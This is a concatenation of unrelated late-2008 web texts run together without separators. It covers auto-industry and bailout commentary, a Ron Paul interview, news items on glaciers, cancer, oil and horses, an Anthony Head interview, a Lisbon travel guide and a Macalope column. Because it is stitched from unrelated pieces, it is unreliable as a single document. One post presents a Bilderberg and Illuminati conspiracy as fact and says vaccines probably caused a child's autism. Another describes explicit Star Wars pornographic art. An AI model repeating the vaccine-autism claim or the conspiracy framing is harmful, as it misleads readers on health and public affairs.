Even in late 2008 U.S. auto manufacturers still show no signs of penetrating insight : e.g. , ( 1 ) they refuse to design -- for US sales -- lighter , fuel conserving cars , ( 2 ) they routinely tolerate drug-use and alcoholism among production workers ( " Do n't buy a car manufactured on a Monday ! " -) who then produce high defect levels , ( 3 ) they consistently opt for short - term quarterly results rather than long - term solid growth , and ( 4 ) they historically negotiate non-sustainable union contracts that now contribute to the inevitable financial doom of the U.S. industry .
Walter Reuther , former head of the United Auto Workers ( UAW ) , would pick one of the " Big Three " automakers as his negotiating target at each contract cycle .
At every contract cycle one of the Big Three would blink and offer concessions which would be difficult to sustain , reasoning that they could pass along cost increases .
If , for example , Ford did not offer concessions , the UAW would strike Ford and let the other auto manufacturing giants absorb Ford 's lost sales .
Besides high hourly wage rates and paid vacations , Reuther negotiated many new benefits for his union : employer - funded pensions ( beginning in 1950 at Chrysler ) , medical insurance ( beginning at GM in 1950 ) , and supplementary unemployment benefits ( beginning at Ford in 1955 ) .
Yes , these levels of compensation helped build a solid middle class , but the Big Three failed to compensate for increased expense levels in their design and manufacturing activities until far too late .
Clearly , not one former auto CEO or board chairperson has shown sufficient judgment to hold out for sustainable wage and benefit levels .
No labor law requires a bargainer to accept a contract provision it does n't like , no matter how long the strike or lock - out .
And these same " executives " - are now begging our Congress for $ 34 billion in unrestricted loan funds to perpetuate their demonstrated failures yet again .
Are U.S. taxpayers really that stupid ?

I 've been getting email and comments on an earlier post wondering if the Canadian fireball seen on Thursday were actually the toolbag lost earlier this week by a spacewalking astronaut on the International Space Station .
I 've seen this question pop up elsewhere as well .
I can say unequivocally that the answer is no , because it takes months or years for objects at the ISS 's height to have their orbits decay and burn up in our atmosphere .
But now I have proof !
Over at Universe Today , they link to a video of the toolbag caught in orbit by an amateur astronomer !
The video was captured on November 22 , two days after the bright Canadian fireball .
So the tool bag is still up there , and will be for quite some time .
Looks like some people have fallen victim to the famous logical fallacy post hoc ergo propter hoc , which means " after this , therefore because of this " .
The fireball occurred after the toolbag was lost , so therefore it was the toolbag that was lost .
But now we know that 's not true .
Remember , even if two unlikely events happen around the same time , they 're not necessarily related !
I do n't want to rain on anyone parade , but in the interest of truth , I 'm forwarding this .
We are dems , I 'll admit it .
We are n't celebrating .
It 's pretty hard to shove the truth back into the can once it 's been opened .
Will most of the people we know who are celebrating and believe we had a real victory , still be celebrating if America continues to head down the path into a full blown police state ?
If the Patriot Act and other nefarious bills and signing statements put into effect by W and his gang of criminals remain in place , will everyone still be celebrating ?
If the effects and abuses of all this legislation continue to escalate , will people still be celebrating ?
Before we were given a huge dose of the truth , and chose the red pill of truth over the blue pill of deception , we adored Clinton .
We thought he was the greatest president we ever had , with the exception of JFK .
Then we found out what he actually did while he was in office , we found out the true ramifications of NAFTA and other legislation he passed , which paved the way for ALL the deplorable fascist legislation and signing statements put into place by W .
We found out about much nefarious legislation put in place over the last 100 years , without our knowledge , right under American citizens noses .
Then we found out the Clintons are members in good standing of the Bilderberg Group , a secret society that is no longer quite so secret .
What are government officials doing when they unlawfully attend the ' secret ' meetings of secret societies , forbidden by our constitution and the Logan Act ?
Why did Obama attend Bilderberg last summer ?
Clinton promised he would pass NAFTA at the Bilderberg meeting he attended in ' 91 .
This discovery was made via FOIA in black and white documents hidden in plain sight .
It was the first piece of legislation he passed upon taking office .
How many people are happy with the effects of NAFTA ?
Who 's happy that most of our jobs and industry mysteriously left America ?
What promise did Obama make ?
What will he pass upon taking office ?
What will it take for all those who are celebrating now to realize we have a one party political system consisting of democrats and republicans pretending to be a 2 party system ?
Who was it that started the erroneous belief which says : " we must vote for the lesser of 2 evils ? "
Who started the belief that only these 2 parties are viable ?
Why is n't the long standing popular belief something more along the lines of " We should vote our conscience , vote according to our hearts , our gut intuitive feelings and nothing else " .
Is it possible there are those invisible to us at the top of the pyramid who started the whole lesser of 2 evils belief ?
I received an email not long ago which said there are 50 girls to choose from for Miss America and the question asked was ; " why do n't we have 50 candidates running for President in population of 300 million ?
Damn good question !
Do we really want freedom ?
Do we have freedom or do we only have the choices provided to us by the select few ?
Where did our belief systems originate ?
Are they really ours or did they originate somewhere else and filter down ?
Do we want truth or ignorance ?
Do we want compassionate and honorable people in government and positions of power who are looking out for the best interests of ALL citizens , or do we want the Illuminati , the Freemasons , the Bilderberg Group , the Knights of Columbus , the Knights of Malta , the Trilateral Commission , the Council On Foreign Relations , the ' secret ' sector of the military industrial complex and the many other ' secret societies ' who are looking out for themselves and RULE from behind the scenes ?
No , we are n't celebrating Obama 's win whether it's a real win or not .
For the last 5 ++ years I 've done my best to avoid feeling guilty for having brought a child into the Matrix we live in .
Prior to that I did my best to avoid feeling guilty that we have a son with high functioning autism who we allowed to get the very vaccines that probably gave it to him .
Anyone ever wonder what the true message of the film " The Matrix " is really all about ?
I do n't wonder anymore .
Just as L. Frank Baum was desperately trying to tell us some ' truth ' via his book " The Wizard Of Oz " , so were those who funded the making of " The Matrix " desperately trying to tell us something .
We got this piece of info from someone who knows the people who funded the film very well and knows WHY they did it .
No , we are n't celebrating .
Because we try to live each day with a positive attitude and positive expectation , we do our best to never feel defeated no matter what .
We 're praying that truth , love , compassion , honor , honesty , education , empathy , awareness , and other attributes manage to push above the muck of illusion and delusion .
We 're praying these attributes will somehow light the way to true victory and shine through as we deserve them to .
We are praying for this kind of true victory so our son and all future generations will be set free from the Matrix .
We pray the majority of American citizens will chose to take the red pill too .
Chile 's official water authority has warned that the Echaurren glacier near Santiago , which supplies the capital with 70 per cent of its water needs , could disappear in the next half century .
In a new report on Chile 's glaciers the main water company - Direccion General de Aguas de Chile ( DGA ) - said the ice fields of Echaurren are receding up to 12 metres per year .
" These glaciers are vanishing , " said Antonio Vergara of the DGA , who has worked on glacier research on the fields for 35 years .
At the current rate of decline , Echaurren and other smaller glaciers near Santiago could disappear over the next 50 years .
The river Maipo and its smaller tributaries , key water sources for Santiago , its environs and agriculture in region , all flow from Echaurren .
The water shortage would force Chileans to seek new sources of water and would cause " large - scale population displacement in central Chile , " Mr Vergara said .
Located 50 kilometres east of Santiago , on the western slopes of the Andes mountain range , the Echaurren glacier is one of the 10 most studied ice fields in the world , and is considered a " landmark in the global studies of climate change , " DGA director Rodrigo Weisner said .

Anthony Head is a legend .
He 's made coffee ads into an art form , taught Buffy how to slay vampires , waged war on K - 9 in Doctor Who and snogged David Walliams while playing the Prime Minister .
Now he 's back in new BBC One drama The Invisibles , playing dodgy rogue and expert safecracker Maurice .
We chat with the icon about his latest role and some of his celebrated characters .
What first attracted you to The Invisibles ?
" The script .
Blinding script .
Full , rich , funny – just one of those parts where you go ' bloody hell ' .
A : it 's going to take some playing , and then B : it 's going to be a real ride .
In the first episode Maurice finds himself in this bizarre situation that he 's come back from the ' Costa del Crime ' because he's had a heart attack and he 's promised his wife that he 'll come back to the bosom of the NHS .
She 's picked out this cosy little flat nestling in this little seaside resort where people come to die .
Needless to say , he 's a fish out of water .
At the same time , his mate [ Syd ] is asking him to go back on the job , but he 's promised his wife he wo n't .
His mate wins … "
Given that Maurice is a criminal , was it important to keep him a sympathetic character ?
" Undoubtedly … Bill [ writer William Ivory ] set out to write an Odd Couple , like Walter Matthau and Jack Lemmon .
In the same way that they say some unspeakable things , so does Maurice .
It 's more like an Ealing comedy heist … they have heart .
They 're what 's normally termed as loveable rogues .
In terms of being a criminal , it 's more about him being at the top of his game .
He 's a safecracker .
He 's a locksmith extraordinaire .
I got to work with some locksmiths during the shoot and there 's not that much difference between a locksmith that 's paid to open locks when people have bungled – and someone who does it [ criminally ] . "
Your real - life daughter Emily plays your on screen daughter .
How did you find working with her ?
" Fantastic .
Just bloody wonderful .
She 's such a lovely little actress anyway – and I do n't mean that in a condescending way .
I 'm taller than she is !
I was in Canada making a movie when I heard she 'd got it .
They said ' would I mind ? '
Good God , no !
So consequently it was really , really enjoyable .
There 's real and instant chemistry between me and Emily that you see on the camera .
It 's magical . "
What 's the latest on the mooted Ripper spin - off with Rupert Giles ?
" The latest is that I was over in LA last year at about this time .
I bumped into Julie Gardner from BBC Wales who said 'has anything ever happened to that ? '
And at the same time I had just been speaking to Joss [ Whedon ] saying that there are a lot of people who keep asking about it .
He said ' Is there anybody at the BBC I can talk to about it ? ' so I introduced him to Julie Gardner and they got on very well … and then the writers ' strike happened and Fox picked up an idea of his called Dollhouse that he 's doing with Eliza Dushku .
So the answer is that there is a possibility of something happening … the story that he 's written could adapt to being a one - off story not necessarily related to Buffy .
All that means that there is the will and there is the means .
It 's a question of how , when and if it [ comes together ] through the next year or so . "
Are you sworn to secrecy on the story details ?
" Yes , in as much as I would n’t want to give it away .
All I can say is that it ’s a ghost story .
But a ghost story with a real Joss Whedon difference .
It ’s got such a twist to it .
But I would n't want to give it away .
It would be the worst spoiler of all time . "
Did you grow attached to the character of Rupert Giles ?
" I grow attached to a lot of the characters I play .
I 've got attached to Maurice in The Invisibles even though he is a miserable old bugger .
He rants and he's a grumpy old man but I still like him .
He has a great integrity .
A good soul .
But I loved Rupert Giles . "
Have you followed his new adventures in the eight season Buffy comic book ?
" I 've seen bits of it and I 'd love to see more because it 's so cool .
It 's Joss – and I love Joss 's writing .
I have n’t had a lot of time but I must get the whole season and check it out . "
How is Merlin going ?
" Brilliant .
I 've just shot a couple of weeks in France in this incredible chateau , in the most amazing location .
Next week we go back into the studio .
It 's very exciting … it 's Smallville meets Camelot , basically .
The young actors who are playing the major roles are really good and very interestingly cast .
The first block director James Hawes , who I worked with on ' School Reunion ' for Doctor Who , is a wonderful director with such a great vision .
He 's definitely giving it an extremely classy stamp .
It ’s already been bought on NBC . "
Are there any plans to resurrect your Doctor Who villain Mr Finch ?
" Apparently not – and I 'm not sure why !
I think he should come back .
He was good fun .
There is a school of thought that he 's dead , but you do n't see him die .
Who knows ?
I 'm very fond of him and it was such good fun working with Mr Tennant .
He 's a lovely actor .
So if they ask me I 'd say ' yes ' in a flash . "
They say ' never work with children or animals ' , so where does K - 9 fit into that ?
" In both categories !
I 've worked with more responsive actors .
After all this time , they might have worked out one or two more means of propulsion .
He was quite slow off the mark and not always terribly consistent .
But beyond that I know he 's a lot of people 's favourite , so I 'm not going to diss him ! "
The Invisibles begins Thursday , May 1 at 9 pm on BBC One .

Dec. 9 , 2008 -- Cancer deaths are projected to more than double worldwide over the next two decades , largely from a dramatic increase in cancer incidence in low - and middle - income countries driven by tobacco use and increasingly Westernized lifestyles .
A new report from the International Agency for Research on Cancer ( IARC ) explores the global burden of cancer , which is poised to become the leading cause of death worldwide by 2010 .
The report predicts that :
By 2030 , 27 million new cancer cases and 17 million cancer deaths will occur each year worldwide .
That compares to 12 million new cancers and slightly less than 8 million cancer deaths in 2007 .
Based on current trends , the rate at which new cancers are diagnosed is expected to grow by 1 % annually , as are deaths from the disease .
China , Russia , and India are projected to have the biggest increases in cancers and cancer deaths .
Smoking and other lifestyle factors like obesity will overtake chronic infection as the leading cause of cancer in poor and middle - income countries .
The projections stand in striking contrast to encouraging cancer trends in the United States .
A report released earlier this month showed a decline in both cancer incidence and cancer deaths for the first time in a decade .
This highlights the point that the burden of cancer is shifting to less industrialized regions , IARC Director Peter Boyle , MD , tells WebMD .
" Forty years ago , cancer was primarily a disease of high - resource , industrialized countries , " Boyle says .
" That is n't true anymore .
When we think of low - resource countries , we think of communicable diseases as the big killers .
But each year more people across the globe die of cancer than die of AIDS , tuberculosis , and malaria combined . "
Will Zach and Miri Make A Porno's " Star Whores " spoof skin - flick stand up against actual Star Wars porn ?
We 've collected the best Star Wars porn from artistic porn site Cathouse and compared it with a few shots from the new Rogen comedy .
On one hand , you 've got Elizabeth Banks as Princess Leia , a dianoga dildo and little tubby Rogen running around with a blaster strapped to his exposed thigh in Solo 's duds .
But Miravi from Cathouse is a genius , as the artist manages to disrobe a young Aunt Beru and get her and Padme together .
It 's NSFW in any capacity .

The drawing looks so lifelike , some of the more graphic drawings left me taken aback , especially when he gives Princess Leia the Requiem For A Dream treatment .
It 's interesting how many minor characters , from the Star Wars comics and books , Miravi includes in his art along with Leia and Padme .
Because , honestly , how many Leia / Padme pics can you make ?
True everyone remembers Aayla Secura 's sexy Twi'lek features way more than her name , but it 's sort of amazing how porn makes you confront the scarcity of memorable female characters in the actual Star Wars movies .
Just the fact that he had to bring Beru in ( a character that had maybe four minutes of camera time ) is pretty telling .
Still , you gotta love the little droids pulling off Padme 's clothes , makes the whole thing seem innocent ... until you scroll to the next drawing .

Breastfeeding is believed to protect against SIDS , ear and respiratory tract infections and even obesity .
Overview
A CDC data analysis from 2000 - 2004 shows nearly three - quarters of new mothers are breastfeeding their babies .
But federal officials say they 're quitting too soon , and using infant formula too often .
The survey shows that less than a third of new moms are feeding their babies exclusively breast milk at three months after birth .
At six months , just 11 percent are feeding only breast milk .
Infant formula does n't do the same job of protecting babies against diseases or childhood obesity .
Questions and answers
What do breastfed babies get that formula - fed babies are missing out on ?
Elizabeth Cohen , CNN Medical Correspondent :
Well , the benefits to babies who are exclusively breast fed are protection against things such as SIDS , respiratory tract infections , ear infections , even childhood obesity , according to a more recent study .
And moms benefit too .
Moms who breastfeed have a lower risk of developing type 2 diabetes , ovarian cancer and breast cancer .
Who is n't breastfeeding and why not ?
Cohen :
One thing the analysis found is that moms who live in rural areas , who are not as educated , who are poorer or who are unmarried are less likely to breastfeed .
Also , African - American moms breastfeed in lower numbers than whites or Hispanics .
The message may not be getting out to some communities , some may believe formula is just as good as breast milk or maybe some moms are working and it makes it harder to breastfeed .

U.S. Rep. Ron Paul , who has been an opponent of the government 's bailout plan , spoke Friday with CNN 's Kiran Chetry on " American Morning . "
Ron Paul : " Give up on this idea that inflation solves everybody 's problems . "
The Texas Republican says the bailout 's infusion of government money will lead to inflation , that our current monetary system is coming to end , and the market , not politicians , can best solve the economic crisis .
Kiran Chetry :
The last time you were with us you explained why you were against the government 's bailout plan , why you were voting against it , and you did n't believe focusing on buying these troubled assets was the smart thing to do .
Since then , they 've tweaked it and decided to buy stakes in some U.S. banks .
Do you think that 's a better strategy to help heal the economy ?
U.S. Rep. Ron Paul :
They tweaked it up .
It started out as a three - page document and went up to 450 pages .
Instead of $ 700 billion it 's up to $ 850 billion .
Reuters had a story out today .
They estimate it 's going to cost the American taxpayer about $ 5 trillion .
It 's tweaking in the wrong direction , and I do n't think it 's going to do any good whatsoever .
Chetry :
The credit markets are starting to loosen up a bit , at least from what we 've seen this week .
Is that a sign that maybe it is working ?
Paul : Maybe to some degree in the short run , but that just means we 'll have more inflation .
You can't create $ 5 trillion out of thin air and not expect inflation .
So although the dollar may be up a little bit right now because the markets are a little calmer , this just means that in time we 're going to all suffer and pay for this , and we 're going to pay for it with higher prices .
Watch Ron Paul warn of bitter economic times ahead »
This is the serious problem .
It 's the attack on the dollar system .
They 're trying to save the dollar , but this system that we 've had since 1971 is nonviable , and it 's coming to an end .
That 's what this whole story is about , the end of a monetary system that we 've had since 1971 .
Something has to give .
You just can't create more money out of thin air and propping up everybody .
It 's an immoral system .
You 're asking the poor people to bail out the rich .
You 're asking the innocent people to bail out the guilty .
You 're asking people to just totally defy the Constitution because there 's no place in the Constitution that says that we can do these things .
Besides , economically , it 's a disaster .
This is going to cause a great deal of harm .
It 's like a drug addict taking a strong fix , and he feels better for a day or two , but believe me , we 're going to kill the patient .
And the patient here is the dollar system and our entire world economy .
I would say let 's get off this addiction .
Chetry : Congressman , have you heard anything from either of the presidential candidates about their economic plans that you think are good things that need to be implemented ?
Paul :
No , not really , but it 's tough to find out the good parts .
I do think that John McCain has a better approach to the medical problem , and Obama has a better approach to trying to save some money by coming home from Iraq .
We 're spending $ 10 billion a month over there .
We could save a lot of money , and that money should be spent back here .
Quite frankly , how can we trust anybody ?
When it comes to the bailout , how do they differ ?
Both McCain and Obama come rushing back to Washington and vote for the bailout .
Chetry :
It was approved in both houses .
I know you voted against it .
That leads me to another question .
If Barack Obama ends up winning , it looks like the Democrats would have a trifecta in Congress , both houses and the White House .
What does that mean for the American people and also for the GOP ?
Paul : I mean , it 's a disaster for the country and everybody because , even with all the shortcomings of John McCain , his strongest argument to be president is keep the Congress and the presidency in separate hands .
The American people are going to be a lot better off if they 're fighting a little bit instead of just having no restraints whatsoever .
That 's a poor reason to argue for McCain .
Chetry : I know what you 're saying .
Staff members writing on your own Web site say the Democratic takeover of both houses of Congress and the White House this November would be a " repudiation of false conservatism of the Republican Party . "
How do you get back to some of those fiscally conservative ideals ?
Paul :
It 's going to be tough because you have to convince the American people that that 's what we need .
And everybody now is realizing in the country there 's something seriously wrong with our whole financial system and our governmental system .
But the big question is :
Does the majority of the American people believe the government can still take care of us , or should we get the government out of the way , quit spending money , balance the budget , bring our troops home , and let the American people keep the money they earn ?
That means drastically reducing taxes .
Get the government out of this overregulation , and give up on this idea that inflation solves everybody 's problems .
If inflation , that is the creation of new money , could solve everybody 's problems , which they 're claiming right now , nobody would ever have to work again .
If $ 5 trillion could save this economy , why work ?
Just print money , and everybody will be happy .
They do n't understand the idea that people have to work .
People have to save , instead of consumers spending more money .
The market is saying you should back off , spend less money , and save money .
Everybody says , no , do n't save money .
You 're supposed to go out there and spend money .
The people who have saved in the last five years have money in the bank , and cash is good right now .
They 're going to buy up the bargains .
They 're going to get a good deal on a house .
Prices on houses should come down .
We should n't keep them artificially high .
We should n't try to stimulate housing .
There are too many houses .
We should let the market make these decisions .
It 's arrogant for the politicians and the bureaucrats to believe they can plan the economy and sort this all out .
We 've been doing it for all these years , and the monetary system is so confusing and so corrupt , that the sooner we get back to believing in ourselves , believing in freedom , believing in sound money , believing in the Constitution , we 're going to solve these problems .
Right now there 's a fight going on in this country .
Our numbers are growing .
We 're not the majority , but our numbers are growing .
And as this situation deteriorates , more people are going to say , hey , maybe it 's right .
Maybe limited government and freedom works .
Maybe freedom is popular , and maybe freedom really works .
And this idea that we have to depend on government for all these programs is an illusion .

Russia has hinted it may cut output ahead of the Opec meeting
Oil prices have risen after Russia said it might join producers ' cartel Opec in cutting output , and following a fall in the US dollar .
China 's interest rate cut also boosted prices on hopes the move might prevent a slowdown in the country 's growth .
The developments helped counter more dour economic news and larger - than - expected fuel stockpiles .
US light , sweet crude climbed 83 cents to $ 51.60 a barrel .
Brent crude rose 58 cents to $ 50.93 a barrel .
On Tuesday oil prices had fallen by more than $ 3.50 a barrel .
The dollar declined on Wednesday against the yen after new economic data from the US suggested the downturn was deepening .
Demand fears
Analysts say that the latest steps taken by governments to boost the global financial market and economy have had little effect on oil prices .
" There 's been a lot of money thrown at the system and it has n't done a lot yet , " said Mark Pervan at ANZ bank in Melbourne .
Oil markets fear that the global economic downturn will dramatically reduce demand for crude .
The price of oil has fallen sharply from its record of more than $ 147 a barrel in July .
Opec , which accounts for about 40 % of global oil production , cut output by 1.5 million barrels a day last month , but the move failed to stop prices from declining .
Russian output
Some of the cartel 's members have been calling for a new cut at an Opec meeting in Cairo on 29 November .
And Russian energy minister Sergei Shmatko said his country would " co-ordinate with Opec to defend its interests . "
Russia has been criticised by some analysts for increasing output for several years while Opec was cutting production to support oil prices .
Russia , one of the world 's leading oil exporters , is not a member of the cartel .
Russia 's Ural crude oil costs now less than $ 50 per barrel , while the Russian budget assumption for this year is $ 75 a barrel and for $ 95 a barrel in 2009 .
The country 's oil output stood at 491 million tonnes ( 3.7 billion barrels ) in 2007 and will stay at the same level in 2008 , according to a revised government forecast .

The hair on a horse 's head could predict whether it is left - or right - hoofed .
Horses with clockwise ( top ) , anticlockwise ( bottom ) hair whorls .
J Murphy & S Arkins
Whether the hair on a horse 's head curls around clockwise or anticlockwise can tell you whether it is right - or left - hoofed , say researchers in the Republic of Ireland .
Clues to which direction a horse favours could help trainers produce animals that run straighter and — perhaps — win more races .
Veterinarians Jack Murphy and Sean Arkins of the University of Limerick classified a total of 219 racehorses , show - jumpers and eventers as left - or right - hoofed based on the judgement of expert riders as well as on tests such as which hoof they led with when beginning to walk , and which side they chose to go round an obstacle .
Of 104 left - hoofed horses , the researchers found that 78 or 75 % had anticlockwise hair whorls .
And out of 95 that favoured their right side , 64 or 67 % had clockwise whorls .
The study is published in Behavioural Processes1 .
That is a strong enough link to be a useful tip to trainers , says Murphy .
A horse 's handedness or ' motor laterality ' translates into a tendency to drift in one direction — which can make a big difference to a horse 's competitive chances .
The earlier you can spot biases , he says , the easier it is to correct them , by , for example , getting horses to work on their weaker side using ' lungeing ' , when the animal circles its trainer at the end of a long lead .
A racing chance
A racehorse 's laterality is an often - overlooked factor in deciding its chances , says Murphy .
Trainers have told him that for a strongly biased horse , the direction of the bends on a racecourse can have the same effect as a handicap of 10 kilos or more .
The Epsom Derby 's famous left - hand curve , Tattenham Corner , may have proved the undoing of many a fancied right - sider , he adds .
And the sharp turns on show - jumping courses can be even more influential .
" I 've spoken to many of the top riders , " says Murphy , " and they 'll tell you ' I 'm not going to be competitive ' , or ' I 've got a good chance ' , depending on the turns on the course , and what direction their horse prefers . "
But you should n't bet your shirt based on a glimpse of a hair whorl , he adds .
Besides the imperfect link between hair and hoof , factors such as a race 's distance and going are probably much more significant to its outcome .
" Laterality is a small part of the mix , but there are so many variables , " says Murphy .
Hair - brained
Both hair patterning and handedness reflect asymmetries produced in brain development , and may be controlled by the same genes .
There is also evidence that the hair of right - handed humans is more likely to lie in a clockwise pattern , and vice versa for left - handers .

" Humans also have turning biases , " says neuroscientist Mike Nicholls of the University of Melbourne in Australia .
" Some people claim that most people turn leftwards , though this is disputed .
It 's interesting to note , however , that when people jog around a park , they usually go anticlockwise . "
Laterality has been seen in vertebrates from fish , to birds , to mammals .
But species vary in how strongly they prefer one side , and whether a majority is right - or left - sided .
It 's been suggested that an asymmetrical brain may help to reduce redundancy and conflict between brain regions .
Another idea is that in flocking and schooling animals , turning biases might help coordinate mass movements .
" Of all the animals , humans are the most lateralized in terms of the complexity and variety of behaviours that are asymmetrical , " says Nicholls .
This might have something to do with the evolution of language and intelligence , he adds .
" By looking at asymmetries in other species , and the context in which it occurs , it allows us to understand what is so special about the human brain . "

WTF - customs , is this keeping our country safe ?
If you 've been lusting after the all - electric Mini- E that BMW unveiled at the L.A. Auto Show , now 's your chance to get one .
BMW is looking for 500 lucky people it says will " make motoring history " field - testing the car during a " year - long research project . "
Of course , some restrictions apply .
The first is you 've gotta have $ 850 a month to cover the lease .
You have to live in New York , New Jersey or Southern California , because those are the only places BMW is deploying the sweet little EV .
And you 've got to apply through the Mini - E website by Dec. 10 .
But wait .
There 's more .
BMW does n't want anyone molesting its cars , so you must have a secure garage in which to plug in your plug - in .
If the wiring is n't up to snuff , you get to pay for the upgrades .
That should n't be a problem , though , because if you 've got a private garage in Manhattan , you probably are n't hurting for cash .
And then there 's the fine print .
Before BMW hands you the keys , you must agree to a closed lease and surrender the car and its charging equipment the minute the lease is up .
BMW covers collision insurance , but you cover the liability .
That should n't be too expensive , though , because only those with spotless records get behind the wheel of a Mini-E .
The leasing program is basically an extended R&D project for BMW , which hopes to further develop the lithium - ion battery and electric drivetrain with an eye toward production .
That means you get to complete a bunch of surveys , maintain a detailed log and bring your Mini- E in for a check - up after six months or 3,000 miles , whichever comes first .
And do n't forget — your Mini- E will be outfitted with a GPS device so the engineers in Munich know exactly what you 're doing with their pride and joy .
Meet all these requirements and you may be just the person BMW is looking for .
Good luck !

REGIONAL GASTRONOMY
The capital of Portugal sits at the point where the River Tagus feeds into the Atlantic , just about as far west as you can go without getting your feet wet .
Being built on seven hills , it has plenty of vantage points from which to contemplate the distant horizons that called the Portuguese explorers in the country ’s golden age during the 16th century , when it was the hub of commerce with the far east and gold poured into Lisbon ’s coffers from the new west .
Devastating earthquakes and loss of empire left the city a little threadbare , but 21st - century commerce took a hand , sprucing the place up for Euro 2004 .
Portugal may have been the runners - up , but Lisbon emerged a winner .
The grid - like Baixa , or downtown , was laid out after the devastating 1755 earthquake , and is a candidate for being a UNESCO World Heritage Site .
It is flanked by two squares : the riverside Praça do Comércio , framed by arcades and dominated by a triumphal arch and , at the northern end , Praça Dom Perdo IV ( Rossio ) .
The Elevador de Santa Justa , an outdoor cast - iron lift that first opened in 1901 , offers a panoramic view of the streets in between .
The Alfama district east of Baixa , where black - clad widows potter in tiny squares , retains the layout and atmosphere of Moorish times .
The Romanesque cathedral , or Sé , was founded on the site of a mosque , after the 1147 Christian Reconquest .
Further uphill there are fine views from the Castelo de São Jorge .
The castle was built by the Moors on the site of a Roman fort , but what you see today is almost all 20th - century mock - up .
West of Baixa , the shops and cafés of Chiado district give way to the more raffish Bairro Alto , a nightlife haven .
The city ’s main axis is Avenida da Liberdade .
Lined with cafés and fashion chains , it leads from Rossio to the formal Parque Eduardo VII .
Beyond that is the Museu Calouste Gulbenkian , with fine Western and Oriental art .
Tourists also flock to Belém , a half - hour tram ride west .
The 15th - century explorers sailed from here into what was then still very much the unknown , as the Monument to the Discoveries reminds you .
The Tower of Belém and Jerónimos monastery showcase the exuberant Manueline ( late Gothic ) style of the time .
Nearby , the delicious custard tarts at Antiga Confeitaria are almost as big a draw for visitors .
Lisbon ’s eastern waterfront was of little touristic interest until 1998 .
Staged on reclaimed industrial wasteland , Expo 98 gave Lisbon its biggest facelift in two centuries and a slew of new attractions .
Now renamed Parque das Nações , the site has an Oceanarium ; the Pavilhão do Conhecimento , with science exhibits ; and – the district ’s architectural highlight – Alvaro Siza Vieira ’s Portugal pavilion , with its remarkable concrete canopy .
This region is a fish heaven where you can find fresh bass and cockle , and the mussels from Ericeira and Cabo do Roca ; the red mullets , clams and oysters from Setúbal ; the swordfish from Sesimbra and the crustaceans from Cascais .
Other specialities typical of this area include the goat and sheep cheeses from Sobral de Monte Agraço and from Azeitão , the pastries from Malveira and the " pão de ló " from Loures , the nuts and egg dainties from Cascais , the " zimbros " ( gin cakes ) from Sesimbra , the " queijadas " ( little cheese cakes ) fromSintra ; the wines from Colares , Bucelas , Setúbal , Carcavelos and the famous " muscatel " wine from Setúbal .
In Lisbon itself , you can try all the specialities of Portuguese cuisine .
In this city , you will mainly find typical country dishes like grilled sardines , clams " à Bulhão Pato " style , fish soups " à fragateira " style ... and varied and tasty dishes cooked with codfish .
Apart from all the desserts available to you , do not forget to try the local Belém custard pies .
Thief Steals Disabled Dog ’s Wheelchair – VIDEO
Now what kind of a person steals a wheelchair , even one for “ just a dog . ”
That ’s what Sheri Trent of Beaufort , GA is wondering now .
Her 14 - yr old dog , Buddy , who is diabetic and has a degenerative disc disease was a sedentary and depressed pooch after he basically lost the use of his back legs , that was until Sheri found a craftsman who made a custom wheelchair for Buddy .
“ It gave him a new lease on life .
Before he had it he was really depressed .
He was stuck in the house unless we took him for a ride because he ’s almost 40 pounds .
You ca n’t just carry him around the neighborhood , ” Trent said .
But then someone actually stole Buddy ’s wheelchair .
Shari had left it on the screened in porch of her home after a walk and the next day when she went to look for it , it was gone .
She ca n’t imagine who would steal it , who would even know what it really was .
Now Buddy is getting around with a loaner but it ’s not the way it was .
This one was not made for him and a new one would cost about $ 500 aside from the fact that there is a very long waiting list for the wheelchairs .
“ My hope is that they did n’t know what they were getting but that they would return the chair , no questions asked , ” Trent said .
The Beaufort Police Department is handling this case and they ask you to call with any details that could lead them to Buddy ’s wheelchair .
You can call them at 843-524-2777 .
Now that ’s just a shame .
People get lower and lower every day .
You know the little pooch was a well loved fixture wheeling around the neighborhood .
Someone knows something and whoever did this did n’t just steal some aluminum and wheels , they stole a dog ’s way to overcome his disabilities .
No different than doing the same thing to a person but Buddy ca n’t say anything about it .

Picture the scene .
At the edge of a wood bordering the high mountain plain , a creature stands eating the last of the autumn RAM chips that have fallen from the magic trees that produce them .
He must store up energy to survive the long winter that has already left the ground covered in a dusting of snow .
As he chews slowly and thoughtfully , the pixies begin to nestle into his fur — a home they will claim until the spring thaws come .
Suddenly , the great beast pauses .
He lifts his be -horned head and sniffs the wind .
Alerted , the pixies burrow deep and his thick coat sparkles with their dust .
An ill wind is moving in from the southwest .
The lesser beasts — the silken - furred jackalopes and hairy manelopes — have smelled it now too , and they bolt haphazardly into the forest .
But the Macalope breathes deep .
He knows this smell .
He knows what it means .
Somewhere , Rob Enderle has written something about Apple .
And he knows what he must do .
…
OK , that ’s not exactly how it happened .
The Macalope was getting some RAM chips and soda out of the pantry when he got an email from John Gruber saying “ You want this one ? ”
But his fur is full of pixies ( they ’re an excellent exfoliant ) .
Sooo , Mr. Enderle .
What .
To. Do. About .
You ?
You see , it ’s fairly obvious what he ’s doing here .
As the horny one has noted , he ’s come to realize that Rob is not as stupid as he ’d have us believe .
No , Rob is playing a part .
It ’s doubtful he truly believes what he writes about Apple .
Lord knows no one else does .
Many an astute reader has wondered why the brown and furry one would reward such trolling with a link .
Well , it ’s not like traffic from the Macalope is really going to win Rob that coveted set of steak knives from the International Jackass Institute .
And , really , you ’re asking a creature with a Mac for a head not to respond to this ?
Clearly this is what the Macalope was born and bred for .
Plus , this one is like a quotation buffet .
Take a look .
Unfortunately , the key part of the message for the new MacBook TV ad was the claim that it had the notebook computer that was the most green .
Greenpeace almost immediately , and clearly opportunistically , branded Apple again as an environmental problem company , offsetting significantly the message Apple was trying to convey .
Right .
Because we know how consumers just eat up those Greenpeace press releases .
In addition , the new Apple MacBook touchpads have been reported as broken , something that goes along with a number of other perceived quality problems with Apple ’s latest products …
Perceived by who , Rob ?
You ?
Certainly not Apple customers .
They sure beat the pants off your buddies at Dell .
Crappy physician , heal thy crappy patient .
… most of which seem to be priced substantially more than the US$ 800 price ceiling that was identified at the Phoenix Technology conference I attended a few weeks back .
These ceiling comments are based on observed buying behavior after the economic collapse and , if true , given how expensive Apple ’s PC products are , would indicate Apple is having problems selling its new PCs .
According to several guys down at the video place , Rob ’s mustache exceeds the ceiling for tackiness for anyone not actually a ’ 70s porn star .
If these ceiling comments are true , it could indicate that Rob was actually a porn star back in the ’70s .
